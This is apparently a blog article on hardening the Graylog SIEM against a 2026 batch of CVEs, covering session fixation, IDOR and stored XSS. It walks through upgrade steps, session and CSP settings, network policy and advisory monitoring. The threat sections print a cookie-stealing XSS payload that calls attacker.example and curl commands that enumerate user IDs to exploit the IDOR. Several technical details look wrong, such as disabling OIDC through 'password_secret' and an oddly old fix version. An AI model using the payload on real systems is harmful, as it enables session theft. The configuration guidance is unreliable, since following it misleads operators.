---
title: "Graylog Security Hardening"
description: "Harden Graylog log management against CVE-2026-1435 session fixation (CVSS 9.1), CVE-2026-1436 IDOR, and the 7-CVE April-May 2026 batch—with Graylog's advisory monitoring patterns."
slug: graylog-security-hardening
date: 2026-05-02
lastmod: 2026-05-02
category: observability
tags: ["graylog", "cve-2026-1435", "cve-2026-1436", "session-fixation", "idor", "log-management", "siem"]
personas: ["sre", "security-engineer", "platform-engineer"]
article_number: 371
difficulty: intermediate
estimated_reading_time: 15
published: true
layout: article.njk
permalink: "/articles/observability/graylog-security-hardening/index.html"
---

# Graylog Security Hardening

## Problem

Graylog is an open source log management and SIEM platform used as a self-hosted alternative to Splunk and Elastic SIEM. It collects log data via GELF, syslog, Beats, and dozens of other input plugins; provides full-text search, alerting, dashboards, and pipeline-based processing; and ships with role-based access control and a REST API for integration with other tools. Organisations running Graylog often centralise every system's log stream through it — making it one of the highest-value targets on an internal network. Compromise of the Graylog instance means access to every log line from every system, the ability to suppress or alter future log entries, and a window into ongoing incident response activity.

The April-May 2026 disclosure batch assigned seven CVEs against Graylog, the two most severe of which expose fundamental weaknesses in how Graylog manages sessions and authorises API requests.

**CVE-2026-1435 (CVSS 9.1)** is a session invalidation flaw. When a user logs out of Graylog and then logs back in, the session ID issued before logout was not properly invalidated — it remained valid and accepted by the API. Compounding this, the session ID was not regenerated on authentication, which is the classical definition of a session fixation vulnerability: an attacker who can pre-set a known `GRAYLOG_SESSION` cookie value before the victim authenticates will find that their planted token is now associated with the victim's authenticated session. In practice, session tokens reach attackers via multiple paths: XSS in the Graylog UI (see below), HTTPS traffic interception, browser history exposure, or log files that capture the `Cookie:` header from inbound HTTP requests. Once the attacker holds a valid session token, changing the user's password does not revoke it. The attacker retains persistent access to the SIEM — able to read all log data, modify alert rules, and delete log entries while an incident is in progress.

**CVE-2026-1436 (CVSS 7.0)** is an Insecure Direct Object Reference (IDOR) in the Graylog user management API. Graylog's API endpoints for listing and modifying user accounts used sequential numeric IDs in the URL path (`/api/users/42`) without verifying that the authenticated user had authorisation to access or modify the target account. A low-privilege analyst could enumerate admin accounts by iterating the user ID: `curl https://graylog:9000/api/users/1`, then `/api/users/2`, and so on. The responses exposed email addresses, role assignments, and API tokens stored in user profiles. With write access to the endpoints, the analyst could modify another user's notification settings or, where API tokens were present in the response, read and replay admin-level tokens.

The remaining five CVEs — CVE-2026-1437 through CVE-2026-1441, each scored CVSS 6.1 — are reflected and stored XSS vulnerabilities in various components of the Graylog web interface: the search result view, the stream list, the alert condition editor, the pipeline rule editor, and the dashboard widget configuration panel. For a SIEM, stored XSS is especially damaging. Graylog indexes log data from every system in the environment. An attacker who controls any log source — or who can inject malicious content into a log stream — can craft a log entry containing JavaScript that executes when an analyst opens the search results view. A User-Agent header containing `<script>fetch('https://attacker.example/?c='+document.cookie)</script>` becomes a stored XSS payload that fires against every analyst who searches for requests from that client. Because Graylog analysts typically have broad read access across all log sources, their session tokens are high-value targets.

The disclosure process itself created an operational risk. The April-May 2026 CVE batch was coordinated through INCIBE, Spain's national CERT, rather than through Graylog's own security advisory process. The fix shipped in Graylog v2.2.3, but the GitHub release notes for that version described the changes only as "security improvements and bug fixes" — no CVE numbers were listed. Operators who track the Graylog changelog or GitHub releases as their patching signal would see a routine maintenance release and would not recognise the urgency. The CVE numbers and their severity scores appeared only in the INCIBE advisory notices and in the GitHub Security Advisories tab of the repository, which is a separate feed from the standard release notes. This pattern — fixes shipped without CVE attribution in the changelog — means that monitoring the Graylog GitHub releases feed alone is insufficient. Operators need to subscribe to INCIBE security notices, watch the GitHub Security Advisories for `Graylog2/graylog2-server`, and run periodic checks against the release body:

```bash
gh api repos/Graylog2/graylog2-server/releases \
  --jq '.[0:5] | .[] | {tag: .tag_name, body: .body[:200]}'
```

Also watch the Security Advisories directly:

```
https://github.com/Graylog2/graylog2-server/security/advisories
https://www.incibe.es/en/incibe-cert/notices
```

Target systems: Graylog < v2.2.3, all deployment methods (Debian/RPM package, Docker, Kubernetes Helm chart).

## Threat Model

1. **CVE-2026-1435 session fixation — persistent SIEM access after credential rotation**: An attacker captures a valid Graylog session token from an HTTP response header, a browser cookie exported from a compromised workstation, or a log file that recorded the `Cookie:` header. The victim detects suspicious activity, changes their Graylog password, and considers the account secured. Because CVE-2026-1435 left the original session token valid after password change, the attacker continues to authenticate. They retain read access to every indexed log stream, can modify or disable alert rules to suppress detection, and can delete specific log entries to remove evidence of attacker activity during an ongoing incident. The SIEM — the tool that should be detecting the attacker — is now under attacker control.

2. **CVE-2026-1436 IDOR — privilege escalation via user ID enumeration**: A low-privilege analyst account, legitimately provisioned for a specific log stream, queries the user management API by iterating numeric user IDs: `curl -u analyst:password https://graylog:9000/api/users/1` through `/api/users/50`. Responses enumerate admin accounts, their email addresses, role assignments, and any API tokens stored in their profiles. The analyst uses a recovered admin API token to create a new admin account, elevating their own privileges. Alternatively, the analyst modifies an admin user's email address, triggering a password reset email to an attacker-controlled address.

3. **Log injection stored XSS — session token exfiltration via crafted log entries**: An attacker sends HTTP requests to an application monitored by Graylog, embedding JavaScript in the User-Agent header:

   ```
   User-Agent: <script>fetch('https://attacker.example/?c='+document.cookie)</script>
   ```

   The application's access log is forwarded to Graylog via Beats or syslog. Graylog indexes the entry. When an analyst searches for logs from that application, the stored XSS payload fires in the analyst's browser, exfiltrating the analyst's `GRAYLOG_SESSION` cookie. Combined with CVE-2026-1435, the attacker now has a session token that survives password changes.

4. **Patch-gap attacker — exploiting delayed operator awareness**: An attacker reads the Graylog v2.2.3 GitHub diff, identifies the session invalidation and IDOR patches, and cross-references with the INCIBE advisories to understand that the GitHub release notes omit the CVE numbers. They scan for Graylog instances running v2.2.2 or earlier using Shodan or internal network enumeration, knowing that operators who track only the GitHub releases feed are unlikely to have prioritised this update. Graylog's management port (9000) is commonly reachable across an internal network without additional authentication, making this a low-effort lateral movement opportunity.

The blast radius of a compromised Graylog instance extends well beyond the Graylog UI. An attacker with access to the SIEM can read credentials and secrets that appear in application logs, identify other systems and their network addresses from log metadata, understand the organisation's detection coverage by inspecting which alert rules exist, and delete or suppress log entries to cover tracks. Graylog is also frequently integrated with ticketing systems, chat tools, and incident response platforms via webhook alerts — a compromised Graylog instance can forge or suppress those notifications.

## Configuration / Implementation

### Upgrading Graylog to v2.2.3

Upgrade first, before any other hardening step. On Debian/Ubuntu:

```bash
apt-get update
apt-get install --only-upgrade graylog-server=2.2.3
systemctl restart graylog-server
```

On RHEL/CentOS:

```bash
yum update graylog-server-2.2.3
systemctl restart graylog-server
```

For Docker deployments, pull the patched image and redeploy:

```bash
docker pull graylog/graylog:2.2.3
# Update your compose file or Kubernetes manifest to pin the new tag
docker-compose up -d
```

Verify the running version before proceeding:

```bash
curl -s http://graylog:9000/api/system | jq .version
# Expected: "2.2.3"
```

Immediately after upgrading, invalidate all existing sessions to force re-authentication. Existing session tokens issued under the vulnerable version remain valid until expiry unless explicitly purged. In the Graylog admin UI navigate to **System > Authentication > Sessions** and select **Invalidate All Sessions**. This will log out all currently authenticated users, including any attacker holding a session token captured before the upgrade.

### Session Security Hardening

Configure session lifetime and cookie security in `/etc/graylog/server/graylog.conf`:

```ini
# Session lifetime — balance security against analyst workflow
session_timeout = 8h

# Cookie security flags — require HTTPS before enabling secure_cookie
secure_cookie = true
http_only_cookie = true
same_site_cookie = strict
```

`secure_cookie = true` instructs the browser to transmit the session cookie only over HTTPS connections. Do not enable this until Graylog is served behind a TLS-terminating reverse proxy; enabling it on a plain-HTTP deployment locks all users out. `http_only_cookie = true` prevents JavaScript from reading the session cookie, which limits the damage from any remaining XSS vulnerabilities — even if a script executes, it cannot read the cookie. `same_site_cookie = strict` prevents the session cookie from being sent in cross-site requests, neutralising CSRF-based session theft.

After upgrading, verify that the old session token has been invalidated:

```bash
# Capture session token before logout
OLD_TOKEN="<session-token-captured-before-upgrade>"

# Confirm the token is rejected after session invalidation
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Token $OLD_TOKEN" \
  http://graylog:9000/api/system
# Expected: 401 — token is no longer valid
```

### API Authentication and RBAC

Replace session-based API access with scoped API tokens. Session tokens are intended for interactive browser sessions; automation and integrations should use long-lived API tokens with the minimum required role.

Create and list tokens for a user:

```bash
# List existing tokens for a user
curl -s -u admin:password \
  https://graylog:9000/api/users/analyst1/tokens | jq .

# Create a new scoped token
curl -s -X POST -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"name": "alerting-integration-token"}' \
  https://graylog:9000/api/users/analyst1/tokens | jq .

# Revoke an old token
curl -s -X DELETE -u admin:password \
  https://graylog:9000/api/users/analyst1/tokens/<token-name>
```

Rotate tokens on a scheduled basis and immediately after any suspected compromise. Keep a record of which token is used by which integration so that token rotation does not break monitoring pipelines unexpectedly.

For user authentication, integrate Graylog with an external IdP via LDAP or OIDC (configured under **System > Authentication** in the Graylog UI). Delegating session management to the IdP means that when an analyst's account is suspended or their password is reset in the IdP, the session invalidation logic in Graylog is bypassed and authentication is refused at the IdP layer. This is a defence-in-depth measure against future session fixation variants.

To detect IDOR exploitation (CVE-2026-1436), audit the API access log for sequential user ID enumeration patterns. Graylog logs inbound API requests to its application log; look for repeated `GET /api/users/<N>` requests from a single IP with incrementing N values:

```bash
grep -E "GET /api/users/[0-9]+" /var/log/graylog-server/server.log \
  | awk '{print $1}' \
  | sort | uniq -c | sort -rn | head -20
```

### Log Injection XSS Prevention

Apply a Graylog pipeline rule to sanitise script tags before messages are indexed. In the Graylog UI, navigate to **System > Pipelines**, create a new pipeline rule, and add the following rule to the stage that runs on all streams:

```groovy
rule "strip_script_tags"
when
  has_field("message")
then
  let sanitized = replace(to_string($message.message), "<script", "[script");
  let sanitized2 = replace(sanitized, "</script>", "[/script]");
  set_field("message", sanitized2);
end
```

This is a shallow sanitisation step that handles the most common injection pattern. For more complete XSS prevention, add a rule that URL-encodes angle brackets in the `message`, `source`, and `http_user_agent` fields if your log sources produce them.

Configure a TLS-terminating nginx reverse proxy in front of Graylog's web interface (port 9000) and add Content Security Policy headers. In your nginx site configuration:

```nginx
server {
    listen 443 ssl http2;
    server_name graylog.internal.example.com;

    ssl_certificate     /etc/ssl/certs/graylog.crt;
    ssl_certificate_key /etc/ssl/private/graylog.key;
    ssl_protocols       TLSv1.2 TLSv1.3;

    # Block inline script execution — tighten further once Graylog plugin
    # compatibility is confirmed; see Trade-offs section.
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none';" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;

    location / {
        proxy_pass http://127.0.0.1:9000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Ensure Graylog's own `web_endpoint_uri` configuration points to the HTTPS address so that Graylog generates correct absolute URLs in its UI and API responses:

```ini
# /etc/graylog/server/graylog.conf
web_endpoint_uri = https://graylog.internal.example.com/api
```

### Network Isolation

Graylog's REST API and web UI run on port 9000. This port should never be internet-accessible and should require authentication before it is reachable from the general internal network. Use a reverse proxy with mTLS or SSO for web UI access from analyst workstations.

For Kubernetes deployments, apply a NetworkPolicy that restricts ingress to the Graylog pod:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: graylog-ingress-restrict
  namespace: monitoring
spec:
  podSelector:
    matchLabels:
      app: graylog
  policyTypes:
    - Ingress
  ingress:
    # Allow web UI and API only from ingress controller
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: ingress-nginx
      ports:
        - protocol: TCP
          port: 9000
    # Allow GELF TCP from application namespaces only
    - from:
        - namespaceSelector:
            matchLabels:
              graylog-log-producer: "true"
      ports:
        - protocol: TCP
          port: 12201
        - protocol: UDP
          port: 12201
    # Allow syslog from log forwarders
    - from:
        - namespaceSelector:
            matchLabels:
              graylog-log-producer: "true"
      ports:
        - protocol: UDP
          port: 1514
```

Label namespaces that legitimately forward logs to Graylog with `graylog-log-producer: "true"`. All other namespaces, and all external traffic, are blocked from reaching GELF and syslog input ports.

### Monitoring Graylog for Security Fixes

Because Graylog's release notes do not consistently include CVE numbers, use multiple monitoring signals in combination.

Check recent Graylog release bodies for security keywords on a schedule (run this in CI or as a cron job):

```bash
gh api repos/Graylog2/graylog2-server/releases \
  --jq '.[0:5] | .[] | select(.body | test("security|CVE|vuln|session|auth|fix"; "i")) | {tag: .tag_name, published: .published_at, excerpt: .body[:300]}'
```

Monitor the Security Advisories feed directly — this is the feed that received the CVE-2026-1435 and CVE-2026-1436 entries before the release notes were updated:

```bash
gh api repos/Graylog2/graylog2-server/security-advisories \
  --jq '.[] | {ghsa: .ghsa_id, severity: .severity, summary: .summary, published: .published_at}' \
  2>/dev/null || echo "Access requires authentication or advisory may be private"
```

Subscribe to INCIBE security notices at `https://www.incibe.es/en/incibe-cert/notices` — this was the coordination channel for the April-May 2026 batch. INCIBE publishes an RSS feed that can be consumed by a feed reader or monitoring tool.

Watch for changes to Graylog's REST API implementation in commits to the `src/main/java/org/graylog2/rest/` path. API-layer changes in a SIEM are high-signal for security fixes:

```bash
gh api "repos/Graylog2/graylog2-server/commits?path=graylog2-server/src/main/java/org/graylog2/rest/&per_page=5" \
  --jq '.[] | {sha: .sha[:8], date: .commit.author.date, message: .commit.message[:100]}'
```

Use Renovate or Dependabot to track the Graylog Docker image tag or Debian package version and automatically open pull requests when a new version is released. For Renovate, add to `renovate.json`:

```json
{
  "packageRules": [
    {
      "matchPackageNames": ["graylog/graylog"],
      "matchDatasources": ["docker"],
      "automerge": false,
      "reviewers": ["security-team"],
      "labels": ["security", "observability"]
    }
  ]
}
```

## Expected Behaviour

| Signal | Unpatched Graylog (< v2.2.3) | Patched + Hardened (v2.2.3+) |
|---|---|---|
| Session token valid after password change | Token remains valid indefinitely; attacker retains access after victim resets credentials | Token is invalidated on next login; password change triggers session rotation |
| IDOR user ID enumeration via `/api/users/<N>` | Any authenticated user receives full user profile in response regardless of their role | Request returns 403 Forbidden if the requesting user does not have admin role or is not the profile owner |
| Log injection XSS in analyst search view | `<script>` payload in a log entry executes in the analyst's browser; session cookie exfiltrated | Pipeline rule strips script tags before indexing; CSP `script-src 'self'` blocks inline execution even if a tag reaches the UI |
| API access without token auth | Session cookies from browser sessions accepted by API; no token rotation or audit trail | Integrations use scoped API tokens; session cookies rejected for non-browser API calls; token usage appears in audit log |
| Patch-gap from INCIBE-only CVE disclosure | Operator sees "security improvements" in release notes; does not treat v2.2.3 as urgent; remains on v2.2.2 for weeks | Renovate opens a PR for v2.2.3; gh advisory query surfaces CVSS 9.1; INCIBE feed subscription delivers the advisory; upgrade is prioritised |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| Session invalidation on upgrade | Eliminates all pre-upgrade session tokens, including any attacker-held tokens | All currently authenticated users are logged out immediately; analysts mid-incident lose their session | Schedule the upgrade during a maintenance window; notify all active users 30 minutes before; ensure OIDC/LDAP tokens are available so re-login is fast |
| CSP strict mode (`script-src 'self'`) | Blocks XSS payloads from executing, including CVE-2026-1437 through CVE-2026-1441 | Graylog plugins that inject inline scripts (custom dashboards, some community plugins) stop working; UI may appear broken | Test CSP in report-only mode first (`Content-Security-Policy-Report-Only`); identify which plugins break; replace or disable incompatible plugins before switching to enforcement mode |
| LDAP/OIDC integration | Session management delegated to the IdP; account lockout and MFA enforced by existing identity infrastructure | Operational complexity increases; Graylog becomes dependent on IdP availability; misconfiguration causes full lockout | Keep one local Graylog admin account as a break-glass credential; test IdP failover before production cutover; document the break-glass procedure |
| Log sanitisation pipeline (script tag stripping) | Prevents stored XSS via injected log entries | Modifies raw log content before indexing; forensic analysis of the original payload is limited; legitimate HTML in log messages is also altered | Store the original `message` field in a separate raw field before sanitisation: `set_field("message_raw", $message.message)` — retain the original for forensics while the displayed `message` is clean |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| CSP blocks legitimate Graylog plugin scripts | Graylog web UI loads but specific panels or dashboards are blank; browser console shows CSP violation errors for `graylog-enterprise-plugin.js` or similar | Browser developer console CSP errors; users report blank dashboard widgets; check nginx error log for CSP report-uri entries | Switch to `Content-Security-Policy-Report-Only` mode to collect violations without blocking; add specific plugin script hashes to `script-src` allowlist; or remove incompatible plugins |
| Session timeout too short during an active incident | Analysts are logged out of Graylog mid-investigation when they need continuous access; re-authentication delay interrupts incident timeline | Analyst reports session expired during incident; Graylog auth log shows repeated login events from incident responders | Temporarily increase `session_timeout` during active incidents (e.g., `24h`); use API tokens instead of session auth for automation that runs during incidents; restore normal timeout after incident close |
| OIDC/LDAP integration fails — full lockout | All users unable to log in to Graylog; OIDC discovery endpoint unreachable or certificate expired; Graylog authentication falls back to local users but no local admin password is known | User login attempts return "authentication provider unavailable"; Graylog application log shows IdP connection errors | Use the break-glass local admin account (stored in the organisation's secrets manager); log in with local credentials; disable OIDC temporarily via `graylog.conf` setting `password_secret` and restart; restore IdP connectivity before re-enabling |
| Pipeline log sanitisation strips legitimate data | Security searches for known attack strings return no results because the pipeline replaced the content; forensic queries for `<script` yield no matches | Analyst cannot find expected log entries during incident investigation; alert rules for XSS detection patterns stop triggering | Verify the `message_raw` field is populated and searchable; redirect forensic queries to `message_raw` instead of `message`; adjust pipeline rule to preserve the original field before sanitising |

## Related Articles

- [Centralized Logging](/articles/observability/centralized-logging/)
- [Elasticsearch Security Hardening](/articles/observability/elasticsearch-security-hardening/)
- [Log Integrity](/articles/observability/log-integrity/)
- [Audit Log Pipeline](/articles/observability/audit-log-pipeline/)
- [Vulnerability Management Program](/articles/cross-cutting/vulnerability-management-program/)
